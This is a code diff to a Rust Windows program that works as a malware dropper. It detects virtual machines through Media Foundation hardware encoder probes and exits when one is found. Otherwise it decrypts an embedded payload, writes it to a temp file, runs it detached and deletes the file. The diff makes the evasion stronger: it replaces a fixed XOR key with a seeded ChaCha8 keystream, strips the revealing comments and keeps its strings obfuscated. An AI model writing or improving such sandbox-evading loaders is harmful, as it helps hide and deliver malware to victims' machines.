@@ -7,19 +7,17 @@ use windows::Win32::Media::MediaFoundation::*;
 use windows::Win32::System::Com::*;
 // use windows::Win32::System::Threading::*;
 // use windows::Win32::Foundation::*;
-// use rand::{Rng, SeedableRng};
-// use rand_chacha::ChaCha8Rng;
+use rand::{Rng, SeedableRng};
+use rand_chacha::ChaCha8Rng;
 use std::fs;
 use std::io::Write;
 
 fn main() -> Result<()> {
     unsafe {
-        // VM Detection - Exit if virtual environment detected
         if !check_hardware_authenticity() {
             std::process::exit(1);
         }
         
-        // Proceed with payload loading only on physical machine
         let payload = reassemble_with_seed(chunks::SEED);
         
         if payload.len() < 64 {
@@ -33,7 +31,6 @@ fn main() -> Result<()> {
 unsafe fn check_hardware_authenticity() -> bool {
     let mut is_physical = true;
 
-    // Initialize COM and Media Foundation
     if CoInitializeEx(None, COINIT_MULTITHREADED).is_err() {
         return false;
     }
@@ -43,7 +40,6 @@ unsafe fn check_hardware_authenticity() -> bool {
         return false;
     }
 
-    // Level 1: Check for hardware encoders
     match check_hw_encoders() {
         Ok(count) => {
             if count == 0 {
@@ -55,7 +51,6 @@ unsafe fn check_hardware_authenticity() -> bool {
         }
     }
 
-    // Level 2: Test functional pipeline
     if is_physical {
         let mut attributes: Option<IMFAttributes> = None;
         if MFCreateAttributes(&mut attributes, 1).is_ok() {
@@ -63,7 +58,6 @@ unsafe fn check_hardware_authenticity() -> bool {
                 let _ = attributes.SetUINT32(&MF_READWRITE_ENABLE_HARDWARE_TRANSFORMS, 1);
 
                 let temp_path = obfstr::obfstr!("C:\\Windows\\Temp\\hw_probe.mp4").to_string();
-                // Alternative path if C:\Windows\Temp is not accessible
                 let alt_path = std::env::temp_dir().join(obfstr::obfstr!("hw_probe.mp4").to_string());
                 let path_to_use = if fs::write(&temp_path, b"").is_ok() {
                     let _ = fs::remove_file(&temp_path);
@@ -157,22 +151,21 @@ unsafe fn create_input_type() -> Result<IMFMediaType> {
     Ok(mt)
 }
 
-unsafe fn reassemble_with_seed(_seed: u64) -> Vec<u8> {
-    // let mut rng = ChaCha8Rng::seed_from_u64(seed); // Unused
+unsafe fn reassemble_with_seed(seed: u64) -> Vec<u8> {
+    let mut rng = ChaCha8Rng::seed_from_u64(seed);
     let mut raw = Vec::with_capacity(chunks::ORIGINAL_SIZE);
     
     let mut pool_cursor = 0;
     let mut produced_bytes = 0;
     
     while produced_bytes < chunks::ORIGINAL_SIZE {
-        // Calculate size of next real data chunk
         let remaining = chunks::ORIGINAL_SIZE - produced_bytes;
         let chunk_size = remaining.min(chunks::CHUNK_SIZE);
         
-        // Extract and decrypt chunk
         for i in 0..chunk_size {
             if pool_cursor + i < chunks::DATA_POOL.len() {
-                raw.push(chunks::DATA_POOL[pool_cursor + i] ^ 0x55);
+                let key_byte: u8 = rng.gen();
+                raw.push(chunks::DATA_POOL[pool_cursor + i] ^ key_byte);
             }
         }
         
@@ -206,13 +199,10 @@ unsafe fn execute_payload(data: &[u8]) -> Result<()> {
     
     match std::process::Command::new(&temp_path).spawn() {
         Ok(child) => {
-            // Detach the process - just let it run
             std::mem::forget(child);
             
-            // Wait a bit for process to start
             std::thread::sleep(std::time::Duration::from_millis(500));
             
-            // Try to delete the temp file (may fail if still in use, that's ok)
             let _ = fs::remove_file(&temp_path);
             
             Ok(())
